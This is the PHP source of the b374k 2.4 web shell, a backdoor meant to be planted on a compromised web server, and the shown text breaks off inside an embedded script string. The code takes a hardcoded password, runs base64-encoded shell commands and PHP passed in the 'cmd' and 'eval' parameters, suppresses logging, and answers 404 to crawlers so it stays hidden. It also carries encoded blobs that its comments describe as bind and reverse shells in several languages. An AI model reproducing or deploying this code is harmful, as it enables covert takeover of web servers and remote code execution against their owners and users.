<?php
/*
	b374k 2.4
	Jayalah Indonesiaku
	(c) 2013
	http://code.google.com/p/b374k-shell

*/

error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors','0');
@ini_set('html_errors','0');
@ini_set('log_errors','0');
@clearstatcache();

$s_name = "b374k"; // shell name
$s_ver = "2.4"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k
$s_login_time = 3600 * 24 * 7; // cookie time (login)

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $login){
			setcookie("b374k",$login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['logout'])){
		$reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
		foreach($_COOKIE as $k=>$v){
			setcookie($k,"",time() - $s_login_time);
		}
		$s_auth = false;
		if(!empty($reload)) header("Location: ".$reload);
	}
}
else $s_auth = true;

// This is a feature where you can control this script from another apps/scripts
// you need to supply password (in md5 format) to access this
// this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)
// give the code/command you want to execute in base64 format
// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
// example :
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
// recommended ways is using POST DATA
// note that it will not works if shell password is empty ($s_pass);
// better see code below
if(!empty($_REQUEST['s_pass'])){
	if(strtolower(trim($s_pass)) == strtolower(trim($_REQUEST['s_pass']))){
		if(isset($_REQUEST['cmd'])){
			$cmd = base64_decode($_REQUEST['cmd']);
			echo exe($cmd);
		}
		elseif(isset($_REQUEST['eval'])){
			$code = base64_decode($_REQUEST['eval']);
			ob_start();
			eval($code);
			$res = ob_get_contents();
			ob_end_clean();
			echo $res;
		}
		else echo $s_title;
	}
	die();
}

// block search engine bot
if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}
elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}

// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$rs_pl ="lZLxj5MwGIZ/Xv+KyvU2SLhj80xMVllcGJrlvLHQncY4JQw+BzlGCe3pzG7+7bbIOaIxUX7q9/bL8zZPOHvi3Iva2eSlA+UXXEFdoDOcSVmJseMkPIXLLefbAi4TvnMqZ3P1/NndhcigKBx0LwDPg/GY8eQOJEWEC5d8CtRBZK4B+4rXEq/88MbdS6h3dMlG7mBNlu9m68mAtvcqpE2/yPBFblCUfzY16PvO+arS3Do0tHMvuGFL3zvHzrVBj4hIdwuyqrnkm29lvANzIJNqYFEkmteYzO4vX0Xzhb+y+yzwriO2Cv3pjU2k9fCQ5mBaTdXLafj6reuOrAPqkcolevww/EhRT4DUKF5pFgveRJqiaCyIQv+W+dPZLLRHitJTr0/Vjt6O07SO8tIklT1f6I1ounhvnRp7RS4klGr7qhPGSQKqxrOZ1RQrnGcbjWvcuMZjnPCyhERCui4Ne6j3eAUlZqvZfGEbL/qeQR+D4HZlG5Nu4odhm6Ae7CHByumpPim4ANOz6M8D+3XQ7M6guJ1JMa0Gl0s8pAgdERTiZPTpn0ZJ1k6jZsrdvAQZxZIrX1lHB4nd31ySvHPdmlAOSdyJG23s37SZrbZJnxkWfUxab92oFaejv5v7L2GNJjhobab6e45IfT8A";
$rs_py = "lVRtT9swEP6c/IpgpmGrwaGFaVJZKiEIE9qAqu20D8Cq1LkmEalt2S6Ufz87SV9ATGiqWveee3vOd+f9vWipVTQreQT8KZAvphDc3w8KY6TuRxETGdBciLwCysQiktHs+OvJ46EuoKoiv1xIoUygINTLmVSCgdah0KF+sV/BHsGEplyAL2OE/ML9ZDAPamfMSN/3nE+89aVDIYFjFtYm8UQtbWSTiaV5ZXQ1TBwMSr0Hl/wtSnxPgVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fUYdbRSekw4KBrtCbyvZPFBpcNmfC5s6cDflJM+ol/r0lGWlgD3h7lHvxPHyYMVAmkYrU61rrI3iucpsCViRwVEDeLNYAdWQKlZgxLL7AN/9udcPHYJCFc6rNNfO4Or7ze0oOT8bJ6Rxs4FmbYT2umRqClrqrFR4RnMllhJ3CVnbuAtjxRtlq7ONAZ7hdT9aeEvaOrvRqOdJkZ2kSxOkPKsrsv9dTW0oJ/mbIEE7FpeplZpur3P1NzOD7jnqWJI5GPbsxgMNkJ/Htsk0VfmT395cTuK450Y6zu+6Dz5UO/jxFvcKe/ac3uaHVWlsuXY/Sm6wJL6Om7WhzYFb6exyenWTTNqdouPb8x/T8WSUnF1bF1uYcQohN/bj259TZ7TrMh0lv8bJ2cXFKLQZ35DW1E5ghjE6ovUHhdLdtqZVaUeZ4y+vPFw5btAC2znBOTCDcdF4bIfMLT7VFYB03pumvbdBnm6ag+rHpXkfgn7QxobMNsA1bdP3D8xRZ3dg2vXVxG/9HXP7xKQktg1kji7+F/HuR8TZ/xH/wPxd4oz4fwE=";
$rs_rb = "tVZrb9s2FP1M/QqWySprcaSm6zDMmWL0sQ4FVtRI0w1DlRU2dW0RkUmNpOoUSfbbx5ccu7aTDNhoGJTuPbxP3mPvPcpaJbMJ4xnwz1i2ky/RHq60btQgy6goIZ0JMashpWKeNdnkux+eXRyqCuo6iyT81TIJOFaCXoCObwXNWFd8PIc4ikqYYtXSCxUhCbqVHJ9+ePHHp9Gvz89evzt9m5ZiwelYQTofa1r14rlaMH5tv3PGZ4s4GWrZwmA6rhVEwEtvUcK4tk56SsvEWM7NHiE2xa+ZiRUumdJqGJRGOwrxpBwWTpp2BlItPpnQrGF73EWKdQUcy1ymM9VOelmRZX1SFCTBDhbSkD4ac+j56S+/pTXwma7y/CjCZlnRxyfn+d/Znx+fHP54fnXU//5mPxs2+RuuYQayFxDJwASr3RmVn70cvQf5GaSLk5B+kzgNzVU6phQaD6RpIxnXmLhuYNcNPMBUcA5UQ1lw4nATmDHunuwygXKhQy/wyprm1FaBrQnhEihWzs+0R+CyEVLjs59P3+aXGuT8ePT+KI+L/dHvr4qT+DjojfDY3SVV4UOGi5+Kx9+UuDhx21O/k/7UfpKlN7CNXXXdpbfsMUlJckBOyBpqUZlO49rEPgO9npBdcswUYJBSyBdS2ORr24ySQSGH+9kGPlSnTmkl5k2eE7IBCTBrh5Y4/TZjWyF21Xkd7o5BZqwfx4k3vPNEd3VLMz9UC/ll2KuTnWjvY1mge5CvmDTejeW7gPYy79I9rCNLS7UKZSoWgzvLtC1pX6cHJ3Qf/D9NC3aaevMubUQDvFf3iSTJ1TUT1515JizblAfEzOXBhq+b7c62hP21bPW9e5agaHt77w35LekFuGrlbQYqpbVYyUjlnNVRZ8v3cI3YnjqC3EFsxtEmtR0baZW7t6Nzw7G2gCEgT7ie8dyPh2e8vavqxrEeUg/gOOQJDqE1akMITQ1fOkZD1t3/TWSoy2wZ9OaFMsqOsJQnLCNB95CUix9tYSYU5KtU5GRoN/Gg7tAWmkHd4VVGCcI18vAi1zu37kzY1eUrJtgdRTfIm27XNf/GOQTktulUD5zONadh91v4M7B14FCYNhulnzPz5CYMhfHyk+fAVvIP";
$rs_c = "rVJhb9owEP0Mv8JjU+tQFxPaaVJpKqFCJbQVEGSapg1FwTHEqrGj2EzQqf99thMYYdqkSf0Q5e7d8zv73uEmSLXO1A3GRCa0tZJyxWmLyDXO8OLqw/XTpUop5xg0cf0tE4RvEgpulU6YbKV3FShnYnWKJZwtTrCdwnqXUfUnrCR5orqKC6qZ+TATVXwjmFG3GBMarGMmoA3ifEUQSeMcNE3449vc+1mv2YJCBMnA79Zr5qIbYgDTLE6SPGICMAOzJbSHg6Bjj9RYSzERLeM147ug9xANR4Owe8Azmesg1VIoGGvJoOvlzz3vN8Vqt5T7OSaHw1Gv359GvdFXR1NB8V5YqqPZ+P5jNAung94jahcUqi1HZhoqU/4UWYpjRtPB59nA6qEziRR7pnIJZdl/Cd8oj26ZhoXMgonECMCTl4Omd8ZQe+sXLG4GSoXhvXcpCWJCqOvcPlzH6BDUcHsB3F6AG0CkEJRomnwXDdS5LrnJJusYbiXxj5NOIbkzTdewQbd2pCAcTB+Drab5ujuZ+cH5u8mX/t15t6wayISUAGxehFUKLlmjuCuXikJi45d6jXJFwcHOq9e30y6kiwpiZ15M+Znmco8gM2tuprknXPgXx8he+587MJxMpuNwHIX3k72vsBz2X90sN+Gk5nnebft4I5yT6j+cVNXEP05e30lVOPlS/wU=";
$rs_win = "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";
$rs_php = "7VRNj9s2ED3bv0JRCayEai3LDhBgXW4u7bFA0BboIbsRZIqyCEsiy6FqB9397x2Skj82zm6QBr20MGxTM5w3X0/vh7eqVtPvgtoYBTdpymTJZxspNw2fMdmmKl0v37zeXkPNmyadcq2lzjVXUhvRbaJ5vJoCN7kRLc8b0QrjTHKdi1Y1ggmTV00PdYTGKTGF3nBDiQZ/Wo0moHyvGkwdhUGYDEYMIQxotly+wdOuoF3fNHjihxPUNMRArCX47adffqZ7w3W7evdrRq/uyLvff7y9Wg1utK3StehSqINrEWJsS0PXWeA6C24CJruOM8PLuw79U1FFTPadicYSY0qz+K/phChKxvInBCsI7b9BONGVeH6c8gb4pfDFeTi8n997iIMhux+xCrZ1WLaOqu+YEbLL+V6AgehKsc40eSX19ir2mKKkR6Md9gTjnJleZzHGmSg7sXrLfLAoCWKf4xpBlFF8HuErwJKG/lw6oGA0L9ocJNvi9oHrP7mOQsMUUmg+c5+bcEZUQpAxnXR/GGMTjqEDa2SPM4Jk6Yoh7AlywRhX9sJQKnqNbOQOs0G/xqcI6Zv3XdHyKE7myTLG+sOd6Fyhk2qnheERYQlpZzhhtsMGZ+FtaOEmu1o06FSvKK0K3JkLsQuq7DIwyt1yE9J8k7eFYXUUpqy8C6L3H+7g/vs4FUhX7FLr2EdPSFkiwbVfpY8WkJdCR+iJY1aPR+8mkp7W5YyP9mcgkdGiPe2aKNeh3U8YPDwEn/H/0aM/DtY4y+1qhAswGd/bjjEXsnz2SeaTeUlXoC2lYo0EPo5jfHIbQbcFfjpqd5GUQAuti4/RnN76Q6iE4mES6jBOsqfGHRoXF4weTGmqtGS5VLzD5HWC8Dh5oZwbB/UKp6w5yF4z2yHu48j6U86tG2SWlS4bjG9gMn/+RvbijcWzN9jg9GQzuh9oZt9rLis71ocHf/Lp4vi4NaKLYYZ2rkM5Q1JPoEPOBrUrwvsJKiW+bkViNfJAYNHlRxxdHMgqaIXxpTMzGDg5rnIYEBHxkZZnWGNBlwBH3yeo7AXAxTOAi5cBH885ekLe8ejbOn/OnjwP43WUG83aM/6g714UrVAPolhZ0fIErZ0q8A6/o7Z9vXrBV6kX/GfVCy6p1+f0Cv7Xq7Mb8JJewZfpFXwjvYLLagD/ml7Bt9Yr+BK9+sci9fZ2+jc=";
$favicon = "AQYD+fyJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAAEZ0FNQQAAr8g3BYrpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAphJREFUOMudk8lPU1EUxvkbXAMdXlug2Kp0eu8ViiUIC2wZJJYqkwUqFiqUMjqgAQppUnAIiBKmFoq0thYKBI0GBGMw0ejGxIVLdyYmYDQ0xPD5HokopmXh4kvuyb3nd853ck8cgLhYylymkblIadlzxmNVUXpAuf3vmwOB9pma+DvWhElkhFRhy4Cer/YpaugZ+bdDASfZiktU8+84PaiKqP3Kr+YbOd6CXnqbHpPtltjUzpgAzQK5mTFPRvZaDpBb9KwClFcOyi1H53oT1j+H0O6qgK4mrSUqgPGpTX+khMZHbuYFTiH4YRxPPk5j4KUDklvJqFjOh//1ME70H8VxZyqkDjFTdZ7cYnzue2d87mZ6Kcy+u42epyZcDZegNVwJzTAJiTMFpmkDsgtEn/Y7YHzuMD5BP1R4NF7yy9lgAbxv+3FzqRz2YD7KprJg9BfC92YEQ6sDkHanQG0Uhg5YoKblG6RbBnJchsD7QXQulqIpoEeZWwvDjB731xywzxrwYKUXkk4xxB2i7ymtQuuBGZCjsojRVwTXcysa/TqUTmSh2HMa91a7YZ0qRNVYLgNwQtwmQrJdsJvUSEBUz/8zQNVQ2o/aoAl3VtpQNpmNMxN5cC22w+LRwzSaC8e8DQ2TFiTZBEiuJ46wOYSZe20fQN9V9KW5JOhaakPxuA6uhQ5Y3DpUjuSgZ84G6roSostM1TqiOuY/kPUdWyOauRh7MYiuUD0uMqCeuUZcmWmBsI4PQS0PRA03wjdxmqMCWEmvitekHWI0uGth99RBahPvJQrNvGomUcurSNzkliaAcy6eiApglWoXuZOs/J+CS0xFMxf8Ks6rWAsXd9g2suJf4GzwyhPBPZ9A/BeAFccYv5NoiN+KdvcLtyxxEwhxgvoAAAAASUVORK5CYII=";
$style = "rVbbjpswEH3vVyBFldoKEBCa3YX3fetjP8CACVbBRmboJov493rAEHNJVpVWfkEwnsuZM2f40eWCg5OTipXX6HfScmitX4ILu6GS5X0ismuXkPTPWYqWZ9HB87x4uNKwdxr5QX2JU1EKGR3yPB+/vFF2LiAKPa8vZJcImVEZ+fXFakTJMusQBEFPOn0rTJ+PJI+BXsDJaCokASZ4xAWnPYkK8ZfKyfT19bWvJe1qkmWMnyPPeq4vfS5k1WWsqUtyjRgvmboIJCmpBYVdd2krG3U5ozlpS+gPFWF8UZDv+7FTiXdnTNSRJGNtE/meqmzn1RvLoFCP3td4ykNhMGRyKChR5t1QCynZmUclzSGuiDwzHnnzBW8ytSDrHnwt/O4GdYDRFbbJHwYOSMIbrDySAgjQb45/dI9PGT1/H4t5ZPAwokVsl15qBTgtWQNjB6y5XarJCkPK2w2Gk1cL4QgRDkkbBXn3H+BuuaLpgV11ipFX/gktV9F1eoSQWyIDP+YiQ90lF0tlPBeamQ72aCekdnMyXGBl6BYzGP1AUjYWyE6nFqggscILWEpKTYGKZVlJe/dMrgpag846jjkyT2pkBpNP6XNJAVR9TU1SnX3vYusqtmhe8IIn/ngedxyupeBT8t4hTLjhC77ZEHnu8Vimlg+z2OMJz/08P0pz/t67jNctvNtuLUVVg+3CBYikZDMYmtTeVEAiAERlMu74gueBrBoE7HW8bsObKb6hUJqWxycPL44JJy10q0iLjF/wrNiwq+G3QcNpn0Sj2xFIbIs3Wygx2VX7+bsSxbtQYVxTDPYmDkQdL3fEzXWxxm1RPHqfbp4mLs135Q6f/Gc8vdvQSu3OK5s30TAwO0rrovRYw4IyoVqS+/RIC7XTAdTZ8fPYYHRd2KrKbY5boRnNH4OtrYrA3Gop5UoHTL7+XLMoxbMWjNNmio032/A79S4U3ffmouf9lKapUlBG33K2C/A+o4yVMXB5cvAhFXdgNolpLo6F41RBp0Ccf2V8f1auayIun7Iz7+MWLoJhc+/3IAxXWrDltKWHjAtg+YJ5+op2gL+O2/av51H7Py7orTO2gjnOreUecjkXApa/XhI9mhxFsHY2mPZijv5qw9sjTurJINRIPFuPhz89yIUA9F/+AQ==";
// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable
$sortable_js = "vVhtb9s4Ev4eIP/B0XUNEZZlO+19ONPcYNMXbHHd7gFb3H5w3IKiaFmJLLkSnWzO8X+/GZJ680vW7eG2QGO+zTPDhxzOjO553lmwi6F3yy5G9PysyHKleJBItpHj+ToVKs5Sl2x4Hq2XMlWFL3iSSOnHT0/u/iBbeHfdrkgkz9+nSub3PHHviBdmQi/0RS65km8Tib1utxqPpLKDxfXjJx595EvZ7bqVNT5ng8/uTXgTXpHpzeDG7892erpLrvTfFwMvcZ/Fdh0N6xCv2iMnm/7ognFfJLwocJFfwDbEwh3cBGgICtwEA9Lt1mbdgdiWELL17sZNpCEDoCOKF5KHDvETmUZqAZuEAXaYoGqxB78+X61kGr5exEnocj/PHorpcEY87sdpIXN1LedZLhENhuZxXii9lBCarpME7VE/AxgotK0/sxDR4UbEc3dUSWu11nSyQR6CTKlsicNsOqNggnsPVypgQxpMeHM5DXo9YhjWtgezo0wbTMO121YybXct9qwGJRQMbi8im4qBd1mmkPJ5dpzyOaxxkNcm4TAKTOL2zNYOmqG3CCtbkjv2o4WhTKSSnfbMFlmHRotqOANfyCQpGqrtuqZO2PKFHW7zuuSqplVf2S9phm0kl2zcJUyzUyXdKe//Z9j/x6xHtHi3e37mZvcyz+NQMoSajmB3DbiVHu12ndI3HMbU40pm804FO3Ww+cXplUizq2fmxrXv3brcC1rqMhY0uwKpvM7CWCKPFO+laGzWk6wG+8oajx3QiRdVLeLi6B01lGBLhpqNGiuXYG2Brojy6LxNnF3YXK4SLsDtdlEdb2/oi4V2LGgul8CMuWcH3rvrx/fhLu78IYxT8G7iYQ/woHfUF4oVT53mSj8O2Q6gmXA8EzvKZWkq858//fKBOd00KFa0+7c/Lv9+/Yo6xvBdBzFihMqkkJ1vpb9k5f9zDBXn+8fxPxyDZc0egzmUU47BrDxwDPZcW4sOH8LbY4dgxMwhbFT5HOmlK56DJR+zUNLELad8gaI4WMDpN8OfDhgpTHwCZ9cRp+adfyPp+in+RnEtBoGZuofYPdFBTJy3XNYEtE67SZt7yKFOvAVGl3WeZ3SVftK+vD3mdPYooCdfLHrKxaIHL9b52e7Vos9eLbg1X3ie80dMFkSWmNuVUZ0/mE3puFclEhxCHp80YyyHeFfBTKtWlQlM6xcgdHUM5TaGTkEhJEx2bFYb46OIeSdWwG1gLdFGVAa01GgrVNDaZ20Un+lAaMN8Nb7dYm4ifB6Gb++B/w9xoSQwSfaHXEcksbhzPOndWoeU/hxSbvjLUtBNhR9AF/6yDdxzpCpi0PO1HI1grtGHNZ7ws1R3wB8jiIesGoDEJpoC8IxJWg2y1Rb+ebeNtBairU755ilrFAp+